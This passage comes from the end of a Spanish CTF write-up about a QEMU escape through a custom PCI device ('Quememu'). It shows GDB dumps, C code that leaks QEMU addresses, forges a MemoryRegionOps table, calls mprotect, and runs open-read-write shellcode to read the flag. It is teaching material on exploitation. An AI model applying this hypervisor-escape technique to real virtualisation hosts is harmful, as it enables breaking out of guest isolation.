+<span class="code-dark-blue">0x5614b2679580</span>: 0x00005614b2679578      0x00005614b263d6a0
+<span class="code-dark-blue">0x5614b2679590</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795c0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-green">gef> </span>x/30gx 0x5614b26794f0 - 0x80
+<span class="code-dark-blue">0x5614b2679470</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679480</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679490</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26794a0</span>: 0x00005614b174cd90      0x0000000000000000
+<span class="code-dark-blue">0x5614b26794b0</span>: 0x00005614b25eaf60      0x0000000000000001
+<span class="code-dark-blue">0x5614b26794c0</span>: 0x00005614b2678a70      0x0000000000000001
+<span class="code-dark-blue">0x5614b26794d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26794e0</span>: 0x00005614b2678a70      0x00005614b2678a70
+<span class="code-dark-blue">0x5614b26794f0</span>: 0x00005614b0eaf460      0x00005614b2678a70
+<span class="code-dark-blue">0x5614b2679500</span>: 0x00005614b171eae0      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679510</span>: 0x0000000000010000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679520</span>: 0x00000000febb0000      0x00005614b00b5320
+<span class="code-dark-blue">0x5614b2679530</span>: 0x0000000000000000      0x0000000000010001
+<span class="code-dark-blue">0x5614b2679540</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679550</span>: 0x0000000000000001      0x0000000000000000
+</code></pre></div><p>Ahí ya podemos identificar el puntero a <code>parent_obj</code>, que es el que da comienzo a la estructura:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/50gx 0x5614b26794a0
+<span class="code-dark-blue">0x5614b26794a0</span>: 0x00005614b174cd90      0x0000000000000000  
+<span class="code-dark-blue">0x5614b26794b0</span>: 0x00005614b25eaf60      0x0000000000000001
+<span class="code-dark-blue">0x5614b26794c0</span>: 0x00005614b2678a70      0x0000000000000001
+<span class="code-dark-blue">0x5614b26794d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26794e0</span>: 0x00005614b2678a70      0x00005614b2678a70
+<span class="code-dark-blue">0x5614b26794f0</span>: 0x00005614b0eaf460      0x00005614b2678a70
+<span class="code-dark-blue">0x5614b2679500</span>: 0x00005614b171eae0      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679510</span>: 0x0000000000010000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679520</span>: 0x00000000febb0000      0x00005614b00b5320
+<span class="code-dark-blue">0x5614b2679530</span>: 0x0000000000000000      0x0000000000010001
+<span class="code-dark-blue">0x5614b2679540</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679550</span>: 0x0000000000000001      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679560</span>: 0x00005614b2679558      0x00005614b26485e0
+<span class="code-dark-blue">0x5614b2679570</span>: 0x00005614b171eb98      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679580</span>: 0x00005614b2679578      0x00005614b263d6a0
+<span class="code-dark-blue">0x5614b2679590</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795c0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795e0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b26795f0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679600</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679610</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5614b2679620</span>: 0x0000000000000000      0x0000000000000000
+</code></pre></div><p>Y aquí vemos un puntero en la posición <code>0x5614b2679580</code> que tiene valor <code>0x5614b2679578</code> (prácticamente lo mismo que la dirección en la que está). Este valor aparece en el índice <code>58</code> del <em>array</em>. Podemos usar este valor para calcular la dirección exacta de la estructura <code>mmio</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> qemu_base_addr </span><span class="mtk5">=</span><span class="mtk1"> data[QUEMEMU_MMIO_OPS_INDEX] </span><span class="mtk5">-</span><span class="mtk1"> QUEMEMU_MMIO_OPS_OFFSET;</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> mmio_base_addr </span><span class="mtk5">=</span><span class="mtk1"> data[QUEMEMU_MMIO_ADDRESS_INDEX] </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">d8</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] qemu base address: 0x</span><span class="mtk6">%lx\n</span><span class="mtk4">"</span><span class="mtk1">, qemu_base_addr);</span>
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"[+] mmio base address: 0x</span><span class="mtk6">%lx\n\n</span><span class="mtk4">"</span><span class="mtk1">, mmio_base_addr);</span>
+</code></pre></div><h3 id="ejecución-de-código-arbitrario">Ejecución de código arbitrario</h3><p>En este punto, tenemos control sobre la dirección de <code>mmio->ops</code>, que actualmente contiene la siguiente tabla de funciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>p quememu_mmio_ops
+$1 = {
+  <span class="code-dark-cyan">read</span> = <span class="code-dark-blue">0x5614afde03e0</span> &lt;<span class="code-dark-yellow">quememu_mmio_read</span>&gt;,
+  <span class="code-dark-cyan">write</span> = <span class="code-dark-blue">0x5614afde0360</span> &lt;<span class="code-dark-yellow">quememu_mmio_write</span>&gt;,  
+  <span class="code-dark-cyan">read_with_attrs</span> = <span class="code-dark-blue">0x0</span>,
+  <span class="code-dark-cyan">write_with_attrs</span> = <span class="code-dark-blue">0x0</span>,
+  <span class="code-dark-cyan">endianness</span> = <span class="code-dark-cyan">DEVICE_NATIVE_ENDIAN</span>,
+  <span class="code-dark-cyan">valid</span> = {
+    <span class="code-dark-cyan">min_access_size</span> = 0x4,
+    <span class="code-dark-cyan">max_access_size</span> = 0x4,
+    <span class="code-dark-cyan">unaligned</span> = 0x0,
+    <span class="code-dark-cyan">accepts</span> = <span class="code-dark-blue">0x0</span>
+  },
+  <span class="code-dark-cyan">impl</span> = {
+    <span class="code-dark-cyan">min_access_size</span> = 0x4,
+    <span class="code-dark-cyan">max_access_size</span> = 0x4,
+    <span class="code-dark-cyan">unaligned</span> = 0x0
+  }
+}
+</code></pre></div><p>Lo que podemos hacer es crear una estructura <code>MemoryRegionOps</code> falsa en el <em>buffer</em> y hacer que <code>mmio->ops</code> apunte ahí. Entonces, cada vez que se ejecute una lectura o una escritura, el dispositivo ejecutará las funciones que nosotros le digamos, y no las definidas en el módulo.</p><p>En esta situación, tenemos dos opciones:</p><ul><li>Usar una cadena ROP para ejecutar instrucciones <em>open-read-write</em> y leer la <em>flag</em></li><li>Poner <em>shellcode</em> de <em>open-read-write</em> para leer la <em>flag</em> y hacer que sea ejecutable mediante <code>mprotect</code></li></ul><p>La primera opción no es muy asequible aquí porque no hay <em>gadgets</em> buenos para hacer <em>Stack Pivot</em>, por lo que usaremos la segunda opción.</p><p>La clave aquí es poner <code>mprotect</code> en la función de escritura, ya que tenemos capacidad de controlar <code>$rdi</code>, <code>$rsi</code> y <code>$rdx</code> (los tres primeros argumentos de llamada a una función). Para poner <code>$rdi</code>, tenemos que cambiar el valor de <code>opaque</code> (que es el siguiente al puntero <code>mmio->ops</code>). Luego, <code>$rsi</code> es el valor de <code>val</code> al ejecutar la escritura, y <code>$rdx</code> es la dirección en la que se escribe.</p><p>Podríamos estar tentados a ejecutar <code>system("/bin/sh")</code>, pero no se puede porque existen reglas <code>seccomp</code> que lo bloquean.</p><p>Entonces, con esto podemos crear un <em>shellcode</em> como el siguiente (habría que modificarlo para la ejecución en remoto, ya que la <em>flag</em> se encuentra en <code>/home/user/flag</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">pop</span>  <span class="mtk7">rbx</span>
+<span class="mtk8">xor</span>  <span class="mtk7">rsi</span>, <span class="mtk7">rsi</span>
+<span class="mtk8">xor</span>  <span class="mtk7">rax</span>, <span class="mtk7">rax</span>
+<span class="mtk8">push</span> <span class="mtk7">rsi</span>
+<span class="mtk8">push</span> <span class="mtk7">rsi</span>
+<span class="mtk8">mov</span>  <span class="mtk7">rdi</span>, <span class="mtk4">0x67616c66</span>  <span class="mtk3"># "flag" as hexadecimal number</span>  
+<span class="mtk8">push</span> <span class="mtk7">rdi</span>
+<span class="mtk8">mov</span>  <span class="mtk7">rdi</span>, <span class="mtk7">rsp</span>
+<span class="mtk8">mov</span>   <span class="mtk7">al</span>, <span class="mtk6">2</span>
+<span class="mtk8">syscall</span>               <span class="mtk3"># int fd = open("flag", 0);</span>
+
+<span class="mtk8">mov</span>   <span class="mtk7">dl</span>, <span class="mtk6">0x64</span>
+<span class="mtk8">mov</span>  <span class="mtk7">rsi</span>, <span class="mtk7">rsp</span>
+<span class="mtk8">xor</span>  <span class="mtk7">edi</span>, <span class="mtk7">eax</span>
+<span class="mtk8">xor</span>   <span class="mtk7">al</span>, <span class="mtk7">al</span>
+<span class="mtk8">syscall</span>               <span class="mtk3"># read(fd, data, 0x64);</span>
+
+<span class="mtk8">mov</span>   <span class="mtk7">al</span>, <span class="mtk6">1</span>
+<span class="mtk8">mov</span>  <span class="mtk7">rdi</span>, <span class="mtk7">rax</span>
+<span class="mtk8">syscall</span>               <span class="mtk3"># write(1, data, 0x64);</span>
+
+<span class="mtk8">pop</span>  <span class="mtk7">rax</span>
+<span class="mtk8">pop</span>  <span class="mtk7">rax</span>
+<span class="mtk8">pop</span>  <span class="mtk7">rax</span>
+<span class="mtk8">push</span> <span class="mtk7">rbx</span>
+<span class="mtk8">ret</span>
+</code></pre></div><p>Usando <a href="https://docs.pwntools.com/en/stable/asm.html"><code>pwntools.asm</code></a> podemos obtener el <em>shellcode</em> como lista de bytes. Y ahora lo ponemos en el <em>exploit</em>, y ya de paso, lo copiamos en el <em>buffer</em> virtual en un <em>offset</em> arbitrario:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk7 mtki">uint8_t</span><span class="mtk1"> shellcode</span><span class="mtk5">[]</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> { </span><span class="mtk6">91</span><span class="mtk1">, </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk6">49</span><span class="mtk1">, </span><span class="mtk6">246</span><span class="mtk1">, </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk6">49</span><span class="mtk1">, </span><span class="mtk6">192</span><span class="mtk1">, </span><span class="mtk6">86</span><span class="mtk1">, </span><span class="mtk6">86</span><span class="mtk1">, </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk6">199</span><span class="mtk1">, </span><span class="mtk6">199</span><span class="mtk1">, </span><span class="mtk6">102</span><span class="mtk1">, </span><span class="mtk6">108</span><span class="mtk1">, </span><span class="mtk6">97</span><span class="mtk1">, </span><span class="mtk6">103</span><span class="mtk1">, </span><span class="mtk6">87</span><span class="mtk1">, </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk6">137</span><span class="mtk1">, </span><span class="mtk6">231</span><span class="mtk1">, </span><span class="mtk6">176</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">15</span><span class="mtk1">, </span><span class="mtk6">5</span><span class="mtk1">, </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk6">199</span><span class="mtk1">, </span><span class="mtk6">194</span><span class="mtk1">, </span><span class="mtk6">100</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk6">137</span><span class="mtk1">, </span><span class="mtk6">230</span><span class="mtk1">, </span><span class="mtk6">137</span><span class="mtk1">, </span><span class="mtk6">199</span><span class="mtk1">, </span><span class="mtk6">48</span><span class="mtk1">, </span><span class="mtk6">192</span><span class="mtk1">, </span><span class="mtk6">15</span><span class="mtk1">, </span><span class="mtk6">5</span><span class="mtk1">, </span><span class="mtk6">176</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">72</span><span class="mtk1">, </span><span class="mtk6">137</span><span class="mtk1">, </span><span class="mtk6">199</span><span class="mtk1">, </span><span class="mtk6">15</span><span class="mtk1">, </span><span class="mtk6">5</span><span class="mtk1">, </span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk6">88</span><span class="mtk1">, </span><span class="mtk6">83</span><span class="mtk1">, </span><span class="mtk6">195</span><span class="mtk1"> };</span>  
+<span class="mtk1">  </span><span class="mtk8">memcpy</span><span class="mtk1">(data </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">80</span><span class="mtk1">, shellcode, </span><span class="mtk5">sizeof</span><span class="mtk1">(shellcode));</span>
+</code></pre></div><p>Por otro lado, tenemos que sacar el <em>offset</em> de <code>mprotect</code> en la PLT de <code>qemu</code> para poder llamar a la función:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">objdump</span> -M intel -d <span class="mtku">qemu-system-x86_64</span> | <span class="code-dark-green">grep</span> mprotect@plt
+000000000031fff0 &lt;<span class="code-red">mprotect@plt</span>&gt;:
+  424ed1:       e8 1a b1 ef ff          call   31fff0 &lt;<span class="code-red">mprotect@plt</span>&gt;  
+  424ee2:       e8 09 b1 ef ff          call   31fff0 &lt;<span class="code-red">mprotect@plt</span>&gt;
+  8fa39e:       e8 4d 5c a2 ff          call   31fff0 &lt;<span class="code-red">mprotect@plt</span>&gt;
+  900564:       e8 87 fa a1 ff          call   31fff0 &lt;<span class="code-red">mprotect@plt</span>&gt;
+  9327b6:       e8 35 d8 9e ff          call   31fff0 &lt;<span class="code-red">mprotect@plt</span>&gt;
+</code></pre></div><p>Y así, tenemos la dirección de <code>mprotect</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk7 mtki">uint64_t</span><span class="mtk1"> mprotect_plt_addr </span><span class="mtk5">=</span><span class="mtk1"> qemu_base_addr </span><span class="mtk5">+</span><span class="mtk1"> MPROTECT_PLT_OFFSET;</span>  
+</code></pre></div><p>Lo último que queda es crear nuestra estructura <code>MemoryRegionOps</code> falsa, modificar el puntero de <code>mmio->ops</code> y poner el nuevo valor de <code>opaque</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  data[QUEMEMU_MMIO_OPS_INDEX] </span><span class="mtk5">=</span><span class="mtk1"> mmio_base_addr </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk6">70</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> QUEMEMU_MMIO_PARENT_OBJ_INDEX) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">;</span>  
+<span class="mtk1">  data[QUEMEMU_MMIO_OPAQUE_INDEX] </span><span class="mtk5">=</span><span class="mtk1"> mmio_base_addr </span><span class="mtk5">&amp;</span><span class="mtk1"> </span><span class="mtk5">~0x</span><span class="mtk6">fff</span><span class="mtk1">;</span>
+<span class="mtk1">  data[</span><span class="mtk6">70</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> mmio_base_addr </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk5">0x</span><span class="mtk6">80</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> QUEMEMU_MMIO_PARENT_OBJ_INDEX) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">;</span>
+<span class="mtk1">  data[</span><span class="mtk6">71</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> mprotect_plt_addr;</span>
+
+<span class="mtk1">  </span><span class="mtk8">set_buff</span><span class="mtk1">();</span>
+</code></pre></div><p>Como puntos a destacar, la estructura falsa <code>MemoryRegionOps</code> se ha puesto en el índice <code>70</code>. Esto es, la función de lectura en el índice <code>70</code> y la función de escritura en el índice <code>71</code>. Y como es de esperar, una contiene la dirección del <em>shellcode</em> y la otra tiene la dirección de <code>mprotect</code> en la PLT, respectivamente.</p><p>Otro punto interesante es que la dirección que va en <code>opaque</code> es la dirección base de la estructura <code>mmio</code>, anulando los tres últimos dígitos hexadecimales para que sea una página de memoria válida.</p><p>Finalmente, nótese cómo la relación entre nuestros índices y los del dispositivo son relevantes para poner los valores justo donde queremos.</p><p>Una vez ejecutado <code>set_buff</code>, la estructura debería haber cambiado. Podemos comprobarlo en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/50gx 0x56119210c4a0
+<span class="code-dark-blue">0x56119210c4a0</span>: 0x00005611911dfd90      0x0000000000000000  
+<span class="code-dark-blue">0x56119210c4b0</span>: 0x000056119207df60      0x0000000000000001
+<span class="code-dark-blue">0x56119210c4c0</span>: 0x000056119210ba70      0x0000000000000001
+<span class="code-dark-blue">0x56119210c4d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c4e0</span>: 0x000056119210ba70      0x000056119210ba70
+<span class="code-dark-blue">0x56119210c4f0</span>: 0x000056119210c5e0      0x000056119210c000
+<span class="code-dark-blue">0x56119210c500</span>: 0x00005611911b1ae0      0x0000000000000000
+<span class="code-dark-blue">0x56119210c510</span>: 0x0000000000010000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c520</span>: 0x00000000febb0000      0x000056118eb94320
+<span class="code-dark-blue">0x56119210c530</span>: 0x0000000000000000      0x0000000000010001
+<span class="code-dark-blue">0x56119210c540</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c550</span>: 0x0000000000000001      0x0000000000000000
+<span class="code-dark-blue">0x56119210c560</span>: 0x000056119210c558      0x00005611920db5e0
+<span class="code-dark-blue">0x56119210c570</span>: 0x00005611911b1b98      0x0000000000000000
+<span class="code-dark-blue">0x56119210c580</span>: 0x000056119210c578      0x00005611920d06a0
+<span class="code-dark-blue">0x56119210c590</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c5a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c5b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c5c0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c5d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c5e0</span>: 0x000056119210c7b0      0x000056118e7b6ff0
+<span class="code-dark-blue">0x56119210c5f0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c600</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c610</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56119210c620</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-green">gef&gt; </span>x/2gx 0x000056119210c5e0
+<span class="code-dark-blue">0x56119210c5e0</span>: 0x000056119210c7b0      0x000056118e7b6ff0
+<span class="code-green">gef&gt; </span>x/8gx 0x000056119210c7b0
+<span class="code-dark-blue">0x56119210c7b0</span>: 0x56c03148f631485b      0x67616c66c7c74856
+<span class="code-dark-blue">0x56119210c7c0</span>: 0x050f02b0e7894857      0x4800000064c2c748
+<span class="code-dark-blue">0x56119210c7d0</span>: 0x050fc030c789e689      0x58050fc7894801b0
+<span class="code-dark-blue">0x56119210c7e0</span>: 0x00000000c3535858      0x0000000000000000
+<span class="code-green">gef&gt; </span>x/23i 0x000056119210c7b0
+   <span class="code-dark-blue">0x56119210c7b0</span>:      <span class="code-dark-green">pop<span class="code-white">    <span class="code-dark-red">rbx</span>
+   <span class="code-dark-blue">0x56119210c7b1</span>:      <span class="code-dark-green">xor<span class="code-white">    <span class="code-dark-red">rsi</span>,<span class="code-dark-red">rsi</span>
+   <span class="code-dark-blue">0x56119210c7b4</span>:      <span class="code-dark-green">xor<span class="code-white">    <span class="code-dark-red">rax</span>,<span class="code-dark-red">rax</span>
+   <span class="code-dark-blue">0x56119210c7b7</span>:      <span class="code-dark-green">push<span class="code-white">   <span class="code-dark-red">rsi</span>
+   <span class="code-dark-blue">0x56119210c7b8</span>:      <span class="code-dark-green">push<span class="code-white">   <span class="code-dark-red">rsi</span>
+   <span class="code-dark-blue">0x56119210c7b9</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">rdi</span>,<span class="code-dark-blue">0x67616c66</span>
+   <span class="code-dark-blue">0x56119210c7c0</span>:      <span class="code-dark-green">push<span class="code-white">   <span class="code-dark-red">rdi</span>
+   <span class="code-dark-blue">0x56119210c7c1</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">rdi</span>,<span class="code-dark-red">rsp</span>
+   <span class="code-dark-blue">0x56119210c7c4</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">al</span>,<span class="code-dark-blue">0x2</span>
+   <span class="code-dark-blue">0x56119210c7c6</span>:      <span class="code-dark-green">syscall</span>
+   <span class="code-dark-blue">0x56119210c7c8</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">rdx</span>,<span class="code-dark-blue">0x64</span>
+   <span class="code-dark-blue">0x56119210c7cf</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">rsi</span>,<span class="code-dark-red">rsp</span>
+   <span class="code-dark-blue">0x56119210c7d2</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">edi</span>,<span class="code-dark-red">eax</span>
+   <span class="code-dark-blue">0x56119210c7d4</span>:      <span class="code-dark-green">xor<span class="code-white">    <span class="code-dark-red">al</span>,<span class="code-dark-red">al</span>
+   <span class="code-dark-blue">0x56119210c7d6</span>:      <span class="code-dark-green">syscall</span>
+   <span class="code-dark-blue">0x56119210c7d8</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">al</span>,<span class="code-dark-blue">0x1</span>
+   <span class="code-dark-blue">0x56119210c7da</span>:      <span class="code-dark-green">mov<span class="code-white">    <span class="code-dark-red">rdi</span>,<span class="code-dark-red">rax</span>
+   <span class="code-dark-blue">0x56119210c7dd</span>:      <span class="code-dark-green">syscall</span>
+   <span class="code-dark-blue">0x56119210c7df</span>:      <span class="code-dark-green">pop<span class="code-white">    <span class="code-dark-red">rax</span>
+   <span class="code-dark-blue">0x56119210c7e0</span>:      <span class="code-dark-green">pop<span class="code-white">    <span class="code-dark-red">rax</span>
+   <span class="code-dark-blue">0x56119210c7e1</span>:      <span class="code-dark-green">pop<span class="code-white">    <span class="code-dark-red">rax</span>
+   <span class="code-dark-blue">0x56119210c7e2</span>:      <span class="code-dark-green">push<span class="code-white">   <span class="code-dark-red">rbx</span>
+   <span class="code-dark-blue">0x56119210c7e3</span>:      <span class="code-dark-green">ret</span>
+</code></pre></div><p>Y ya lo tenemos todo listo, solo falta llamar a <code>mprotect</code> con <code>mmio_write</code> y luego ejecutar el <em>shellcode</em> con <code>mmio_read</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk8">mmio_write</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">2000</span><span class="mtk1">, </span><span class="mtk5">0</span><span class="mtk6">7</span><span class="mtk1">);</span>  
+<span class="mtk1">  </span><span class="mtk8">mmio_read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Y así, conseguimos un <em>exploit</em> que nos saca la <em>flag</em> y retorna correctamente del programa:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">   ___             __  __
+  / _ \ _   _  ___|  \/  | ___ _ __ ___  _   _
+ | | | | | | |/ _ \ |\/| |/ _ \ '_ ` _ \| | | |
+ | |_| | |_| |  __/ |  | |  __/ | | | | | |_| |
+  \__\_\\__,_|\___|_|  |_|\___|_| |_| |_|\__,_|
+
+-------------------------------------------------  
+[+]          By DiegoAltF4 and Dbd4           [+]
+-------------------------------------------------
+
+/root # /exploit
+vm.nr_hugepages = 32
+[*] buff virtual address  = 0x7fdbbf2eb000
+[*] buff physical address = 0xafe4000
+
+[*] base ==> 20
+[*] off  ==> 0x7fff
+
+[+] base ==> 21
+
+[*] off  ==> 0x6f6b
+
+[+] base ==> 16
+[+] off  ==> 0xfe00
+
+[+] qemu base address: 0x55f4968ce000
+[+] mmio base address: 0x55f49a0e74a0
+
+flag{fake_flag_4_testing}
+</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/CTF-scripts/tree/main/HackOn%20CTF/Quememu/exploit.c">exploit.c</a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#configuración-del-entorno">Configuración del entorno</a></li><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a><ul><li><a href="#vulnerabilidad">Vulnerabilidad</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#aclaraciones">Aclaraciones</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#interacción-con-el-dispositivo-pci">Interacción con el dispositivo PCI</a></li><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#ejecución-de-código-arbitrario">Ejecución de código arbitrario</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
